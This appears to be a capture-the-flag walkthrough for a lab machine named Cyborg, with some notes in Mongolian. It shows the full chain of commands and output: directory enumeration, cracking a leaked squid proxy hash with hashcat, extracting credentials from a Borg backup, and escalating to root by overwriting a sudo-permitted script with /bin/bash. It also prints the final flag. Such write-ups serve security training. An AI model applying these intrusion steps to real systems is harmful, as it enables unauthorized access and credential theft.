# Cyborg
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1f727c8a-5b12-432f-b31d-af61c6a8ee70)
`` Cyborg``

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b4b29b20-bc15-4253-a591-7c61b1456b0b)
``$ sudo nmap -sC -sV 10.10.66.129 ``
```

─$ gobuster dir -u http://10.10.66.129/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://10.10.66.129/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes: 404
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess (Status: 403) [Size: 277]
/.hta (Status: 403) [Size: 277]
/.htpasswd (Status: 403) [Size: 277]
/admin (Status: 301) [Size: 312] [--> http://10.10.66.129/admin/]
/etc (Status: 301) [Size: 310] [--> http://10.10.66.129/etc/]
/index.html (Status: 200) [Size: 11321]
/server-status (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/f72350f9-7f14-4e7d-91f5-c62167570295)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2de61cc4-03d0-4d92-937d-bddc09c8ab01)
``
/admin аар хандаж орсон
``
```
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/26d6bb61-ac29-4ded-869e-3f2507e334d5)
``
http://10.10.97.132/etc/ хандаж орсон
``
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/a7a480ca-2c48-4bea-9af5-b884d638c3a9)

``
http://10.10.97.132/etc/squid/passwd хандан орход hash утга байсан
``

```
┌──(melle㉿kali)-[~/Downloads]
└─$ cat crack.hash
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn

┌──(melle㉿kali)-[~/Downloads]
└─$ sudo nano crack.hash
[sudo] password for melle:

┌──(melle㉿kali)-[~/Downloads]
└─$ hashcat -m 1600 crack.hash /usr/share/wordlists/rockyou.txt --show

┌──(melle㉿kali)-[~/Downloads]
└─$ hashcat -m 1600 crack.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

```

```
└─$ hashcat -m 1600 crack.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 1815/3694 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Wed Apr 17 09:22:35 2024 (3 secs)
Time.Estimated...: Wed Apr 17 09:22:38 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 11531 H/s (7.98ms) @ Accel:64 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 39168/14344384 (0.27%)
Rejected.........: 0/39168 (0.00%)
Restore.Point....: 38912/14344384 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: toutou -> luvhim
Hardware.Mon.#1..: Util: 91%

Started: Wed Apr 17 09:21:58 2024
Stopped: Wed Apr 17 09:22:39 2024

```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/3adb6d7f-6d73-4859-ab87-a0d7df0a3972)


archive --> Download
татаад үзтэл zip файл байсан бөгөөд үүнийг олж авсан хэш утгаар онгойлгосон
```
┌──(melle㉿kali)-[~/Downloads]
└─$ tar -xvf archive.tar
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

```
┌──(melle㉿kali)-[~/Downloads]
└─$ cat home/field/dev/final_archive/README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/8e8739f6-2cfe-40f7-889c-1602ea0f41cf)


```
┌──(melle㉿kali)-[~/Downloads]
└─$ borg list home/field/dev/final_archive/
Enter passphrase for key /home/melle/Downloads/home/field/dev/final_archive:
Enter passphrase for key /home/melle/Downloads/home/field/dev/final_archive:
Enter passphrase for key /home/melle/Downloads/home/field/dev/final_archive:
exceeded the maximum password retries
```


```
┌──(melle㉿kali)-[~/Downloads]
└─$ borg mount home/field/dev/final_archive/ unpacked
```
```
┌──(melle㉿kali)-[~/Downloads]
└─$ cat note.txt
wow i'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/683726e8-3e51-4a92-831d-ec2cea3cd797)
`` └─$ ssh alex@cyborg.thm ``

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/e4568c90-dfb9-4cdb-ac97-a8c30b5c1e05)

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ chmod 777 /etc/mp3backups/backup.sh
alex@ubuntu:~$ echo "/bin/bash" > /etc/mp3backups/backup.sh
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
```

```
root@ubuntu:/root# ls -la
total 36
drwx------ 4 root root 4096 Dec 30 2020 .
drwxr-xr-x 24 root root 4096 Dec 30 2020 ..
-rw------- 1 root root 2875 Dec 31 2020 .bash_history
-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc
drwx------ 2 root root 4096 Aug 6 2020 .cache
drwxr-xr-x 2 root root 4096 Dec 30 2020 .nano
-rw-r--r-- 1 root root 148 Aug 17 2015 .profile
-r-xr--r-- 1 root root 43 Dec 30 2020 root.txt
-rw-r--r-- 1 root root 66 Dec 30 2020 .selected_editor
root@ubuntu:/root# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```











